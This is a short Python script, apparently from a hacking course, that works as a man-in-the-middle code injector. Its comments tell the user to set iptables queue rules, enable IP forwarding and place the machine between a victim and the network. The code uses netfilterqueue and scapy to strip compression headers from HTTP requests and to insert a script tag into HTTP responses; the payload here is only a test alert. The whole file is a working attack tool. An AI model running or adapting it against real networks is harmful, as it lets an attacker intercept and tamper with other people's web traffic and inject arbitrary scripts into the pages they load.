#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

# you must run iptables rules for input and output for queue 0
# to run it against a remote computer use the forward chain
# start your web browser and flush ip tables
# enable IP forwarding to the attacker machine
# be the man in the middle
# run it


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            # we user regular expressions in this case to get the html code back without encryption
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
            print(new_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] response")
            print(scapy_packet.show())
            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
        packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()





